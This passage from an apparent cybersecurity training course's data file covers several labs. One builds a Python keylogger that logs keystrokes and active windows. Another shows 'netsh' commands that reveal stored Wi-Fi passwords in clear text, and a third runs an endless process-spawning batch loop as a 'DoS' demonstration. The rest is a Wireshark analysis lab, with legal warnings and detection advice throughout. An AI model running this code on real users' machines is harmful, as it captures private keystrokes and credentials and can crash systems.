              content: 'Creating or using keyloggers without proper authorization is illegal in many jurisdictions and can lead to severe penalties. This lab is for educational purposes only.'
            }
          },
          {
            title: 'Learning Objectives',
            content: 'In this lab, you will:',
            steps: [
              { title: 'Understand Keylogger Mechanics', content: 'Learn how keyboard input is captured at the system level' },
              { title: 'Develop a Basic Keylogger', content: 'Build a simple Python keylogger' },
              { title: 'Explore Security Implications', content: 'Understand the security risks posed by keyloggers' },
              { title: 'Learn Detection Methods', content: 'Study how to detect keyloggers on a system' }
            ]
          }
        ]
      },
      {
        id: 'implementation',
        title: 'Python Keylogger Implementation',
        content: 'In this section, we\'ll implement a basic keylogger in Python using the pynput library.',
        subsections: [
          {
            title: 'Required Libraries',
            content: 'For this implementation, we\'ll use the pynput library, which allows us to control and monitor input devices.',
            steps: [
              { title: 'Install pynput', content: 'Install the pynput library using pip', terminal: 'pip install pynput' },
              { title: 'Import Library', content: 'Import the necessary modules from pynput' }
            ]
          },
          {
            title: 'Basic Keylogger Code',
            content: 'Here\'s a simple Python keylogger implementation:',
            code: `from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")
    with open("keylog.txt", "a") as f:
        f.write(key + "\\n")

with Listener(on_press=log_keystroke) as listener:
    listener.join()`,
            language: 'python'
          },
          {
            title: 'Code Explanation',
            content: 'Let\'s break down how this keylogger works:',
            steps: [
              { title: 'Import Listener', content: 'We import the Listener class from pynput.keyboard to monitor keyboard events' },
              { title: 'Define Handler Function', content: 'The log_keystroke function is called each time a key is pressed' },
              { title: 'Format Key', content: 'We convert the key to a string and remove single quotes for cleaner output' },
              { title: 'Write to File', content: 'Each keystroke is appended to a file named "keylog.txt"' },
              { title: 'Create and Start Listener', content: 'We create a listener that calls our function on each key press and join its thread' }
            ]
          }
        ]
      },
      {
        id: 'saving-running',
        title: 'Saving and Running the Script',
        content: 'Now that we\'ve created our keylogger script, let\'s save and run it:',
        subsections: [
          {
            title: 'Saving the Script',
            content: 'Follow these steps to save the script:',
            steps: [
              { title: 'Create File', content: 'Open a text editor and create a new file' },
              { title: 'Paste Code', content: 'Copy and paste the keylogger code into the file' },
              { title: 'Save as Python File', content: 'Save the file as "keylogger.py"' }
            ]
          },
          {
            title: 'Running the Script',
            content: 'To run the keylogger:',
            steps: [
              { title: 'Open Terminal', content: 'Open a command prompt or terminal' },
              { title: 'Navigate to Directory', content: 'Navigate to the directory where you saved the file', terminal: 'cd path/to/directory' },
              { title: 'Run Script', content: 'Run the script using Python', terminal: 'python keylogger.py' }
            ]
          },
          {
            title: 'Testing the Keylogger',
            content: 'To test if the keylogger is working:',
            steps: [
              { title: 'Type Characters', content: 'With the script running, type various characters' },
              { title: 'Stop the Script', content: 'Press Ctrl+C in the terminal to stop the script' },
              { title: 'Check Output File', content: 'Open keylog.txt to see the recorded keystrokes', terminal: 'cat keylog.txt' }
            ]
          }
        ]
      },
      {
        id: 'advanced-keylogger',
        title: 'Advanced Keylogger Features',
        content: 'Let\'s enhance our keylogger with some additional features:',
        subsections: [
          {
            title: 'Timestamp Recording',
            content: 'Add timestamps to record when each key was pressed:',
            code: `from pynput.keyboard import Listener
import datetime

def log_keystroke(key):
    key = str(key).replace("'", "")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("keylog.txt", "a") as f:
        f.write(f"[{timestamp}] {key}\\n")

with Listener(on_press=log_keystroke) as listener:
    listener.join()`,
            language: 'python'
          },
          {
            title: 'Window Tracking',
            content: 'Record which application window was active during keystrokes:',
            code: `from pynput.keyboard import Listener
import datetime
import psutil
import win32gui
import win32process

def get_active_window():
    active_window = win32gui.GetForegroundWindow()
    pid = win32process.GetWindowThreadProcessId(active_window)[1]
    process = psutil.Process(pid)
    process_name = process.name()
    window_title = win32gui.GetWindowText(active_window)
    return f"{process_name} - {window_title}"

def log_keystroke(key):
    key = str(key).replace("'", "")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_window = get_active_window()
    with open("keylog.txt", "a") as f:
        f.write(f"[{timestamp}] [{active_window}] {key}\\n")

with Listener(on_press=log_keystroke) as listener:
    listener.join()`,
            language: 'python'
          },
          {
            title: 'Additional Required Libraries',
            content: 'For the advanced features, you\'ll need to install these additional libraries:',
            terminal: 'pip install psutil pywin32',
            warning: {
              type: 'info',
              title: 'Platform Specific',
              content: 'The window tracking feature is Windows-specific. For macOS or Linux, you\'ll need to use different libraries appropriate for those platforms.'
            }
          }
        ]
      },
      {
        id: 'ethical-considerations',
        title: 'Ethical and Legal Considerations',
        content: 'Understanding the ethical and legal implications of keyloggers is crucial for cybersecurity professionals:',
        subsections: [
          {
            title: 'Legal Implications',
            content: 'The legal status of keyloggers varies depending on how they\'re used:',
            steps: [
              { title: 'Authorized Monitoring', content: 'Employers may legally monitor company-owned devices with proper disclosure' },
              { title: 'Parental Monitoring', content: 'Parents can legally monitor their minor children\'s activities' },
              { title: 'Unauthorized Use', content: 'Using keyloggers without authorization may violate computer fraud laws, privacy laws, and wiretapping regulations' },
              { title: 'Criminal Penalties', content: 'Unauthorized keylogging can lead to significant fines and imprisonment' }
            ]
          },
          {
            title: 'Ethical Uses of Keyloggers',
            content: 'Some legitimate uses of keyloggers include:',
            steps: [
              { title: 'IT Troubleshooting', content: 'Identifying user errors or software issues' },
              { title: 'Application Testing', content: 'Testing user interfaces and software interactions' },
              { title: 'Security Research', content: 'Researching security vulnerabilities in controlled environments' },
              { title: 'Corporate Compliance', content: 'Ensuring compliance with company policies on company-owned devices' }
            ]
          },
          {
            title: 'Important Warning',
            content: 'Always ensure you have proper authorization before using keyloggers:',
            warning: {
              type: 'danger',
              title: 'Legal Warning',
              content: 'Creating or using keyloggers without proper authorization is illegal in many jurisdictions and can result in severe civil and criminal penalties. This lab is provided for educational purposes only to understand how these tools work and how to defend against them.'
            }
          }
        ]
      },
      {
        id: 'detection-prevention',
        title: 'Keylogger Detection and Prevention',
        content: 'As security professionals, it\'s important to understand how to detect and prevent keyloggers:',
        subsections: [
          {
            title: 'Detection Methods',
            content: 'Here are some ways to detect keyloggers:',
            steps: [
              { title: 'Antivirus Software', content: 'Use reputable antivirus software with real-time protection' },
              { title: 'Process Monitoring', content: 'Check for suspicious processes in Task Manager or Activity Monitor' },
              { title: 'Network Monitoring', content: 'Monitor for unexpected outbound connections' },
              { title: 'File System Analysis', content: 'Look for recently added or modified files in system directories' },
              { title: 'Behavior Analysis', content: 'Watch for unusual system behavior or performance issues' }
            ]
          },
          {
            title: 'Prevention Techniques',
            content: 'Here are best practices to prevent keylogger attacks:',
            steps: [
              { title: 'Keep Software Updated', content: 'Regularly update your operating system and applications' },
              { title: 'Use Virtual Keyboards', content: 'For sensitive information, use on-screen keyboards' },
              { title: 'Implement Multi-Factor Authentication', content: 'Use MFA to protect accounts even if passwords are compromised' },
              { title: 'Be Cautious with Downloads', content: 'Only download software from trusted sources' },
              { title: 'Use Password Managers', content: 'Password managers can autofill credentials without typing them' }
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "network-scanning",
    "number": 5,
    "title": "Detect Scanned Networks and Retrieve Their Profiles using CLI Script",
    "shortTitle": "Network Scanning",
    "icon": "ri-wifi-line",
    "duration": "Approximately 3 hours",
    "difficulty": "Intermediate",
    "tools": "Windows Command Prompt, PowerShell, Network Adapter",
    "description": "Learn how to use command-line tools to scan for available wireless networks, extract their profiles, and analyze the results for security assessments.",
    "sections": [
      {
        "id": "overview",
        "title": "Overview",
        "content": "Network scanning is an essential skill for security professionals to identify active networks and analyze their configurations. This lab will demonstrate how to detect nearby wireless networks using Windows command-line tools and retrieve their profiles for security assessment.",
        "subsections": [
          {
            "title": "Understanding Network Scanning",
            "content": "Network scanning involves detecting available networks, retrieving their properties, and analyzing configurations such as SSID, security type, and signal strength. This is useful for assessing security risks and identifying potential vulnerabilities."
          },
          {
            "title": "Learning Objectives",
            "content": "In this lab, you will:",
            "steps": [
              { "title": "List Available Wireless Networks", "content": "Use Windows commands to display all detected Wi-Fi networks." },
              { "title": "Retrieve Saved Network Profiles", "content": "Access and extract stored network credentials and settings." },
              { "title": "Analyze Network Security", "content": "Assess security parameters like encryption type and authentication methods." }
            ]
          }
        ]
      },
      {
        "id": "command-line-scanning",
        "title": "Executing a Command Line Script for Network Scanning",
        "content": "In this section, we will execute a Windows command-line script to scan for available networks and retrieve their details.",
        "subsections": [
          {
            "title": "Basic Wi-Fi Network Scan",
            "content": "Run the following command in Command Prompt to list all detected networks:",
            "code": "netsh wlan show networks mode=bssid",
            "language": "batch"
          },
          {
            "title": "Retrieving Saved Network Profiles",
            "content": "To retrieve profiles of previously connected networks, use:",
            "code": "netsh wlan show profiles",
            "language": "batch"
          },
          {
            "title": "Extracting Network Security Details",
            "content": "To display detailed security settings of a saved network, replace 'WiFiName' with the actual SSID of the network:",
            "code": "netsh wlan show profile name=\"WiFiName\" key=clear",
            "language": "batch"
          },
          {
            "title": "Script for Automated Scanning",
            "content": "Below is a simple batch script to automate network scanning and save results to a text file:",
            "code": "@echo off\nnetsh wlan show networks mode=bssid > networks.txt\nnetsh wlan show profiles > profiles.txt\necho Network scan completed! Results saved.",
            "language": "batch"
          }
        ]
      },
      {
        "id": "analyzing-results",
        "title": "Analyzing and Interpreting Scan Results",
        "content": "Understanding the output of these commands is essential for security assessments.",
        "subsections": [
          {
            "title": "Network Visibility",
            "content": "The 'show networks' command lists all visible SSIDs along with their security settings, indicating potential risks of open networks."
          },
          {
            "title": "Security Assessment",
            "content": "The 'show profile' command can expose stored Wi-Fi credentials, highlighting the importance of securing stored network profiles."
          },
          {
            "title": "Encryption and Authentication",
            "content": "Identifying networks using outdated encryption (e.g., WEP) helps assess security weaknesses in a given environment."
          }
        ]
      }
    ]
}

  {
    id: 'dos-attack',
    number: 6,
    title: 'Execute a Denial-of-Service (DoS) Attack using a Batch File',
    shortTitle: 'DoS Attacks',
    icon: 'ri-error-warning-line',
    duration: 'Approximately 2 hours',
    difficulty: 'Intermediate',
    tools: 'Text Editor, Command Prompt',
    description: 'Understand how Denial-of-Service attacks work by creating a simple batch file script. This lab helps security professionals recognize and defend against such attacks.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'Denial-of-Service (DoS) attacks aim to make a service unavailable by overwhelming it with traffic. In this lab, we\'ll explore the mechanics of DoS attacks and their impact on systems.',
        subsections: [
          {
            title: 'Understanding DoS Attacks',
            content: 'Denial-of-Service (DoS) attacks overwhelm a system or network by flooding it with excessive requests, making it unavailable for legitimate users. These attacks can target servers, websites, or even individual computers, leading to significant disruptions.',
            warning: {
              type: 'warning',
              title: 'Legal Warning',
              content: 'Executing DoS attacks against systems without explicit permission is illegal and can result in severe penalties. This lab is for educational purposes only and should be performed in isolated environments.'
            }
          },
          {
            title: 'Types of DoS Attacks',
            content: 'There are several types of DoS attacks:',
            steps: [
              { title: 'Volume-Based Attacks', content: 'Overwhelming a target with massive amounts of traffic' },
              { title: 'Protocol Attacks', content: 'Exploiting vulnerabilities in network protocols' },
              { title: 'Application Layer Attacks', content: 'Targeting specific applications or services' },
              { title: 'Distributed DoS (DDoS)', content: 'Using multiple compromised systems to launch coordinated attacks' }
            ]
          },
          {
            title: 'Learning Objectives',
            content: 'In this lab, you will:',
            steps: [
              { title: 'Understand DoS Mechanics', content: 'Learn how DoS attacks work and their various forms' },
              { title: 'Create a Simple DoS Script', content: 'Develop a basic batch file that demonstrates DoS principles' },
              { title: 'Observe System Impact', content: 'Monitor the effects of the DoS attack on system resources' },
              { title: 'Learn Prevention Methods', content: 'Explore techniques to prevent and mitigate DoS attacks' }
            ]
          }
        ]
      },
      {
        id: 'batch-script',
        title: 'Creating a Simple DoS Batch Script',
        content: 'In this section, we\'ll create a simple batch script that demonstrates the principles of a DoS attack by exhausting system resources.',
        subsections: [
          {
            title: 'Basic DoS Script',
            content: 'Here\'s a simple batch script that demonstrates resource exhaustion:',
            code: `@echo off
:loop
start notepad
start calc
start cmd
goto loop`,
            language: 'batch'
          },
          {
            title: 'Script Explanation',
            content: 'Let\'s understand how this script works:',
            steps: [
              { title: '@echo off', content: 'Prevents the commands from being displayed in the console' },
              { title: ':loop', content: 'Creates a label for the loop' },
              { title: 'start notepad/calc/cmd', content: 'Launches multiple instances of these applications' },
              { title: 'goto loop', content: 'Returns to the loop label, creating an infinite loop' }
            ]
          },
          {
            title: 'Warning',
            content: 'This script will rapidly consume system resources and may cause your system to become unresponsive. Only run it in a controlled environment and be prepared to force shutdown your computer if necessary.',
            warning: {
              type: 'danger',
              title: 'Critical Warning',
              content: 'This script will rapidly consume system resources and may cause your system to become unresponsive. Only run it in a controlled environment and be prepared to force shutdown your computer if necessary.'
            }
          }
        ]
      },
      {
        id: 'execution',
        title: 'Executing and Analyzing the DoS Attack',
        content: 'In this section, we\'ll execute our DoS script in a controlled environment and analyze its impact.',
        subsections: [
          {
            title: 'Preparing Your Environment',
            content: 'Before executing the script, take these precautions:',
            steps: [
              { title: 'Save Your Work', content: 'Close all important applications and save your work' },
              { title: 'Isolate the System', content: 'Ensure you\'re working on an isolated system, not a production environment' },
              { title: 'Plan for Recovery', content: 'Know how to force shutdown your computer (e.g., holding power button)' },
              { title: 'Prepare Task Manager', content: 'For Windows, know how to launch Task Manager (Ctrl+Shift+Esc)' }
            ]
          },
          {
            title: 'Creating the Script',
            content: 'Follow these steps to create the batch script:',
            steps: [
              { title: 'Open Text Editor', content: 'Open Notepad or any text editor' },
              { title: 'Copy Script', content: 'Copy the DoS script from above' },
              { title: 'Save as Batch File', content: 'Save the file with a .bat extension, e.g., "dos_attack.bat"' }
            ]
          },
          {
            title: 'Executing the Script',
            content: 'To execute the script:',
            steps: [
              { title: 'Open Task Manager', content: 'Before running the script, open Task Manager to monitor system resources' },
              { title: 'Run the Script', content: 'Double-click the batch file to run it' },
              { title: 'Observe Resource Usage', content: 'Watch as CPU, memory, and process count rapidly increase' },
              { title: 'Terminate the Attack', content: 'Quickly end the attack by pressing Alt+F4 repeatedly or using Task Manager to end the batch process' }
            ]
          }
        ]
      },
      {
        id: 'impact-analysis',
        title: 'Impact of DoS Attacks',
        content: 'Understanding the impact of DoS attacks is crucial for security professionals:',
        subsections: [
          {
            title: 'System-Level Impact',
            content: 'DoS attacks can have several effects on targeted systems:',
            steps: [
              { title: 'Resource Exhaustion', content: 'CPU, memory, and disk resources become depleted' },
              { title: 'System Slowdown', content: 'The system becomes increasingly unresponsive' },
              { title: 'Service Disruption', content: 'Applications and services may crash or become unavailable' },
              { title: 'Potential Data Loss', content: 'Unsaved work may be lost if the system crashes' }
            ]
          },
          {
            title: 'Business Impact',
            content: 'For organizations, DoS attacks can have serious consequences:',
            steps: [
              { title: 'Financial Loss', content: 'Revenue loss due to service downtime' },
              { title: 'Reputation Damage', content: 'Customer trust may be eroded' },
              { title: 'Operational Disruption', content: 'Business operations may be interrupted' },
              { title: 'Recovery Costs', content: 'Expenses related to recovering from the attack' }
            ]
          }
        ]
      },
      {
        id: 'advanced-dos',
        title: 'Advanced DoS Techniques',
        content: 'While our simple batch script demonstrates the basic principle of resource exhaustion, real-world DoS attacks are more sophisticated:',
        subsections: [
          {
            title: 'Network Flooding Attacks',
            content: 'These attacks overwhelm network bandwidth:',
            steps: [
              { title: 'ICMP Flood', content: 'Sending numerous ping requests to overwhelm the target' },
              { title: 'UDP Flood', content: 'Sending large numbers of UDP packets to random ports' },
              { title: 'SYN Flood', content: 'Exploiting the TCP handshake by sending SYN packets without completing the connection' }
            ]
          },
          {
            title: 'Application Layer Attacks',
            content: 'These attacks target specific applications or services:',
            steps: [
              { title: 'HTTP Flood', content: 'Overwhelming web servers with HTTP requests' },
              { title: 'Slowloris', content: 'Keeping many connections open to the target server by sending partial HTTP requests' },
              { title: 'DNS Amplification', content: 'Using DNS servers to amplify attack traffic directed at the target' }
            ]
          }
        ]
      },
      {
        id: 'prevention',
        title: 'DoS Attack Prevention and Mitigation',
        content: 'As security professionals, understanding how to prevent and mitigate DoS attacks is essential:',
        subsections: [
          {
            title: 'Prevention Techniques',
            content: 'Here are key strategies to prevent DoS attacks:',
            steps: [
              { title: 'Traffic Filtering', content: 'Use firewalls to filter abnormal or malicious traffic' },
              { title: 'Rate Limiting', content: 'Implement rate limiting to restrict the number of requests from a single source' },
              { title: 'Load Balancing', content: 'Distribute traffic across multiple servers to prevent a single point of failure' },
              { title: 'Blackhole Routing', content: 'Route malicious traffic to a "black hole" where it\'s discarded' }
            ]
          },
          {
            title: 'Mitigation Strategies',
            content: 'When under attack, these strategies can help mitigate the impact:',
            steps: [
              { title: 'Increase Capacity', content: 'Scale up resources to handle the increased load' },
              { title: 'DDoS Protection Services', content: 'Use specialized DDoS protection services (e.g., Cloudflare, AWS Shield)' },
              { title: 'Traffic Analysis', content: 'Analyze traffic patterns to identify and block attack sources' },
              { title: 'Incident Response Plan', content: 'Have a prepared response plan for DoS/DDoS incidents' }
            ]
          },
          {
            title: 'Defensive Coding Practices',
            content: 'Developers can implement these practices to make applications more resilient:',
            steps: [
              { title: 'Input Validation', content: 'Validate all user inputs to prevent malicious data' },
              { title: 'Request Timeouts', content: 'Implement timeouts for requests to prevent resource exhaustion' },
              { title: 'Captcha Systems', content: 'Use CAPTCHA for sensitive operations to prevent automated attacks' },
              { title: 'Resource Quotas', content: 'Set limits on resource usage per user or session' }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'wireshark',
    number: 7,
    title: 'Capture and Analyze Network Traffic using Wireshark',
    shortTitle: 'Wireshark Analysis',
    icon: 'ri-radar-line',
    duration: 'Approximately 3 hours',
    difficulty: 'Intermediate',
    tools: 'Wireshark, Network Adapter',
    description: 'Learn how to use Wireshark to capture, filter, and analyze network traffic. This essential skill allows security professionals to investigate network issues and detect suspicious activities.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'Wireshark is a powerful network protocol analyzer that allows you to examine data from a live network or from a capture file. In this lab, we\'ll learn how to use Wireshark for security analysis.',
        subsections: [
          {
            title: 'What is Wireshark?',
            content: 'Wireshark is a free and open-source packet analyzer used for network troubleshooting, analysis, software and communications protocol development, and education. It allows you to examine the details of network traffic at various levels, from connection-level information to packet-level inspection.',
            warning: {
              type: 'info',
              title: 'Legal Note',
              content: 'While Wireshark itself is legal to use, capturing network traffic without proper authorization may violate privacy laws and regulations. Always ensure you have permission to monitor the network traffic you\'re analyzing.'
            }
          },
          {
            title: 'Learning Objectives',
            content: 'In this lab, you will:',
            steps: [
              { title: 'Install Wireshark', content: 'Download and set up Wireshark on your system' },
              { title: 'Capture Network Traffic', content: 'Learn to capture live network traffic on different interfaces' },
              { title: 'Apply Filters', content: 'Use display and capture filters to focus on relevant traffic' },
              { title: 'Analyze Protocols', content: 'Inspect and analyze different network protocols' },
              { title: 'Identify Security Issues', content: 'Detect potential security vulnerabilities and suspicious traffic' }
            ]
          }
        ]
      },
      {
        id: 'installation',
        title: 'Installing Wireshark',
        content: 'Before we can begin capturing and analyzing network traffic, we need to install Wireshark on our system.',
        subsections: [
          {
            title: 'Download Wireshark',
            content: 'Follow these steps to download Wireshark:',
            steps: [
              { title: 'Visit Official Website', content: 'Go to https://www.wireshark.org' },
              { title: 'Navigate to Download', content: 'Click on the "Download" button in the top navigation' },
              { title: 'Select Version', content: 'Choose the appropriate version for your operating system (Windows, macOS, Linux)' }
            ]
          },
          {
            title: 'Installation Process',
            content: 'The installation process varies slightly depending on your operating system:',
            steps: [
              { title: 'For Windows', content: 'Run the installer and follow the prompts. Consider installing WinPcap/Npcap when prompted, as it\'s required for live capture.' },
              { title: 'For macOS', content: 'Open the .dmg file and drag Wireshark to your Applications folder. You may need to install additional packages like ChmodBPF.' },
              { title: 'For Linux', content: 'Use your package manager (e.g., apt install wireshark for Debian/Ubuntu) and ensure proper permissions for non-root users.' }
            ]
          },
          {
            title: 'Post-Installation Setup',
            content: 'After installation, you may need to configure additional settings:',
            steps: [
              { title: 'Configure Capture Permissions', content: 'On Linux, add your user to the "wireshark" group (sudo usermod -a -G wireshark $USER)' },
              { title: 'Install Required Dependencies', content: 'Ensure all required dependencies are installed' },
              { title: 'Configure Interface Options', content: 'Configure network interface options if necessary' }
            ]
          }
        ]
      },
      {
        id: 'capturing-traffic',
        title: 'Capturing Network Traffic',
        content: 'Now that Wireshark is installed, let\'s learn how to capture network traffic.',
        subsections: [
          {
            title: 'Starting Wireshark',
            content: 'Launch Wireshark and familiarize yourself with the interface:',
            steps: [
              { title: 'Launch Application', content: 'Open Wireshark from your applications menu or Start menu' },
              { title: 'Identify Interface List', content: 'The main screen shows available network interfaces' },
              { title: 'Check Interface Details', content: 'Hover over an interface to see its details, including IP address' }
            ]
          },
          {
            title: 'Selecting a Network Interface',
            content: 'Choose the appropriate network interface to capture traffic:',
            steps: [
              { title: 'Identify Your Active Interface', content: 'Look for the interface with active traffic (represented by a moving graph)' },
              { title: 'For Wired Connection', content: 'Select your Ethernet interface (e.g., eth0, Ethernet adapter)' },
              { title: 'For Wireless Connection', content: 'Select your Wi-Fi interface (e.g., wlan0, Wi-Fi adapter)' },
              { title: 'For Loopback Testing', content: 'Select the loopback interface (lo, localhost) for local traffic' }
            ]
          },
          {
            title: 'Starting a Capture',
            content: 'Begin capturing network traffic:',
            steps: [
              { title: 'Double-click Interface', content: 'Double-click on the desired interface or select it and click the "Start capturing packets" button' },
              { title: 'Observe Live Capture', content: 'Watch as packets begin to appear in the packet list pane' },
              { title: 'Generate Traffic', content: 'Open a web browser and visit a website to generate network traffic' },
              { title: 'Stop Capture', content: 'Click the red "Stop" button when you\'ve collected enough data' }
            ]
          },
          {
            title: 'Capture Options',
            content: 'Wireshark provides various options to customize your capture:',
            steps: [
              { title: 'Open Capture Options', content: 'Click on "Capture" > "Options" before starting a capture' },
              { title: 'Set Capture Filter', content: 'Apply capture filters to limit the traffic captured (e.g., "host 192.168.1.1")' },
              { title: 'Configure Buffer Size', content: 'Adjust buffer size for long-duration captures' },
              { title: 'Enable Name Resolution', content: 'Enable or disable name resolution options for DNS, transport, or network names' },
              { title: 'Set Output File', content: 'Specify a file to save the capture automatically' }
            ]
          }
        ]
      },
      {
        id: 'analyzing-traffic',
        title: 'Analyzing Network Traffic',
        content: 'After capturing network traffic, the next step is to analyze it effectively.',
        subsections: [
          {
            title: 'Understanding the Wireshark Interface',
            content: 'The Wireshark interface consists of several key areas:',
            steps: [
              { title: 'Packet List Pane', content: 'The top section showing a list of captured packets with summary information' },
              { title: 'Packet Details Pane', content: 'The middle section showing detailed information about the selected packet' },
              { title: 'Packet Bytes Pane', content: 'The bottom section showing the raw byte data of the selected packet' },
              { title: 'Display Filter Bar', content: 'The bar at the top for applying display filters to the captured packets' }
            ]
          },
          {
            title: 'Using Display Filters',
            content: 'Display filters help you focus on specific traffic of interest:',
            code: `# Filter by protocol
http                   # Show only HTTP traffic
dns                    # Show only DNS traffic
tcp                    # Show only TCP traffic

# Filter by address
ip.addr == 192.168.1.1 # Show traffic to/from specific IP
ip.src == 10.0.0.5     # Show traffic from specific source
ip.dst == 8.8.8.8      # Show traffic to specific destination

# Filter by port
tcp.port == 80         # Show traffic on port 80
tcp.dstport == 443     # Show traffic to destination port 443

# Combining filters
http && ip.addr == 192.168.1.10    # HTTP traffic to/from specific IP
!(arp || icmp)                     # Exclude ARP and ICMP traffic
tcp.flags.syn == 1 && tcp.flags.ack == 0  # Show SYN packets (connection attempts)`,
            language: 'text'
          },
          {
            title: 'Inspecting Packet Details',
            content: 'Learn how to dive deeper into packet information:',
            steps: [
              { title: 'Select a Packet', content: 'Click on a packet in the packet list pane' },
              { title: 'Expand Protocol Layers', content: 'Click on the arrows in the packet details pane to expand each protocol layer' },
              { title: 'Examine Headers', content: 'Review header information for insights into the communication' },
              { title: 'Inspect Payload', content: 'Examine the payload data to see the actual content being transmitted' }
            ]
          },
          {
            title: 'Following Streams',
            content: 'One of Wireshark\'s most powerful features is the ability to follow protocol streams:',
            steps: [
              { title: 'Select a Packet', content: 'Click on a packet that\'s part of the conversation you want to follow' },
              { title: 'Right-click', content: 'Right-click and select "Follow" > "[Protocol] Stream" (e.g., "Follow TCP Stream")' },
              { title: 'View Conversation', content: 'Review the entire conversation between the two endpoints' },
              { title: 'Change Stream', content: 'Use the stream selector to navigate between different conversations' },
              { title: 'Apply as Filter', content: 'Click "Apply as Filter" to show only packets in this stream' }
            ]
          }
        ]
      },
      {
        id: 'practical-scenarios',
        title: 'Practical Security Scenarios',
        content: 'Let\'s explore some real-world security scenarios where Wireshark is useful.',
        subsections: [
          {
            title: 'Detecting Port Scans',
            content: 'Port scans are often precursors to attacks. Here\'s how to detect them:',
            steps: [
              { title: 'Apply Filter', content: 'Use `tcp.flags.syn==1 && tcp.flags.ack==0` to find SYN packets without ACK' },
              { title: 'Look for Patterns', content: 'A large number of SYN packets to different ports from the same IP may indicate a port scan' },
              { title: 'Check Time Frame', content: 'Port scans often happen in rapid succession over a short period' },
              { title: 'Analyze Source', content: 'Check if the source IP is external to your network' }
            ]
          },
          {
            title: 'Identifying Unencrypted Credentials',
            content: 'Wireshark can help identify when credentials are transmitted insecurely:',
            steps: [
              { title: 'Filter for HTTP Traffic', content: 'Use `http.request.method == "POST"` to find POST requests' },
              { title: 'Inspect Form Data', content: 'Look for form submissions in the packet details' },
              { title: 'Follow HTTP Streams', content: 'Right-click and select "Follow HTTP Stream" to see the complete transaction' },
              { title: 'Look for Keywords', content: 'Search for terms like "username", "password", "login", etc.' }
            ]
          },
          {
            title: 'Analyzing Suspicious DNS Traffic',
            content: 'Unusual DNS traffic can indicate malware communication or data exfiltration:',
            steps: [
              { title: 'Filter for DNS', content: 'Use `dns` to show only DNS traffic' },
              { title: 'Look for Unusual Domains', content: 'Check for randomly generated domain names (often used by malware)' },
              { title: 'Check Query Frequency', content: 'Unusually high frequency of queries may indicate beaconing' },
              { title: 'Inspect DNS TXT Records', content: 'Large or unusual TXT records could be used for data exfiltration' }
            ]
          },
          {
            title: 'Detecting ARP Spoofing',
            content: 'ARP spoofing is a common MITM attack technique:',
            steps: [
              { title: 'Filter for ARP', content: 'Use `arp` to show only ARP traffic' },
              { title: 'Look for Duplicate Addresses', content: 'Check for multiple MAC addresses claiming the same IP address' },
              { title: 'Check for Unsolicited Responses', content: 'Look for ARP responses without corresponding requests' },
              { title: 'Create a Timeline', content: 'Analyze when MAC-IP bindings change unexpectedly' }
            ]
          }
        ]
      },
      {
        id: 'wireshark-tools',
        title: 'Advanced Wireshark Tools',
        content: 'Wireshark includes several advanced tools for deeper analysis.',
        subsections: [
          {
            title: 'Statistics Tools',
            content: 'Explore the various statistics tools available:',
            steps: [
              { title: 'Conversations', content: 'Go to "Statistics" > "Conversations" to see all conversations between endpoints' },
              { title: 'Protocol Hierarchy', content: 'Use "Statistics" > "Protocol Hierarchy" to see a breakdown of protocols' },
              { title: 'Endpoints', content: 'Check "Statistics" > "Endpoints" to list all devices communicating' },
              { title: 'IO Graphs', content: 'Create visual graphs of traffic with "Statistics" > "IO Graph"' }
            ]
          },
          {
            title: 'Expert Information',
            content: 'Wireshark\'s Expert Information feature highlights potential issues:',
            steps: [
              { title: 'Access Expert Info', content: 'Go to "Analyze" > "Expert Information"' },
              { title: 'Review Errors', content: 'Check the "Errors" tab for serious issues' },
              { title: 'Check Warnings', content: 'Review "Warnings" for potential problems' },
              { title: 'Look for Notes', content: 'Scan "Notes" for informational items of interest' }
            ]
          },
          {
            title: 'Packet Colorization',
            content: 'Wireshark uses colors to highlight different types of traffic:',
            steps: [
              { title: 'Learn Color Codes', content: 'Light purple: TCP traffic, Light blue: UDP traffic, Black: Errors' },
              { title: 'Customize Colors', content: 'Go to "View" > "Coloring Rules" to customize or create new rules' },
              { title: 'Create New Rule', content: 'Click "+" to add a new coloring rule based on a display filter' },
              { title: 'Apply Color Rules', content: 'Ensure "Colorize Packet List" is enabled under the "View" menu' }
            ]
          }
        ]
      },
      {
        id: 'saving-sharing',
        title: 'Saving and Sharing Captures',
        content: 'Learn how to save, export, and share your captures effectively.',
        subsections: [
          {
            title: 'Saving Capture Files',
            content: 'Save your captures for later analysis:',
            steps: [
              { title: 'Basic Save', content: 'Go to "File" > "Save" or press Ctrl+S to save the entire capture' },
              { title: 'Save As', content: 'Use "File" > "Save As" to specify a different format or location' },
              { title: 'Save Filtered', content: 'Apply a display filter first, then use "File" > "Save As" and check "Displayed packets only"' },
              { title: 'Save Selected Packets', content: 'Select specific packets, right-click, and choose "Save As" to save only those packets' }
            ]
          },
          {
            title: 'Exporting Data',
            content: 'Export specific data from your captures:',
            steps: [
              { title: 'Export PDUs', content: 'Use "File" > "Export PDUs to File" to extract higher-level protocol data' },
              { title: 'Export Objects', content: 'Go to "File" > "Export Objects" to extract files transferred over HTTP, SMB, etc.' },
              { title: 'Export as CSV', content: 'Use "File" > "Export Packet Dissections" > "As CSV" for spreadsheet analysis' },
              { title: 'Export as Plain Text', content: 'Export as plain text for documentation or reporting' }
            ]
          },
          {
            title: 'Sanitizing Captures',
            content: 'Before sharing captures, it\'s important to sanitize sensitive information:',
            steps: [
              { title: 'Use TraceWrangler', content: 'Consider using TraceWrangler (a separate tool) for advanced sanitization' },
              { title: 'Address Anonymization', content: 'Anonymize IP addresses to protect network details' },
              { title: 'Remove Credentials', content: 'Ensure no plaintext passwords or authentication tokens are included' },
              { title: 'Check Payload Data', content: 'Review payload data for any sensitive information' }
            ],
            warning: {
              type: 'warning',
              title: 'Important',
              content: 'Always sanitize capture files before sharing them with others. Capture files may contain sensitive information such as passwords, session cookies, or personal data.'
            }
          }
        ]
      }
    ]
  },
  {
    id: 'xss-attacks',
    number: 8,
    title: 'Cross-Site Scripting (XSS) Attacks using DVWA',
    shortTitle: 'XSS Attacks',
    icon: 'ri-code-box-line',
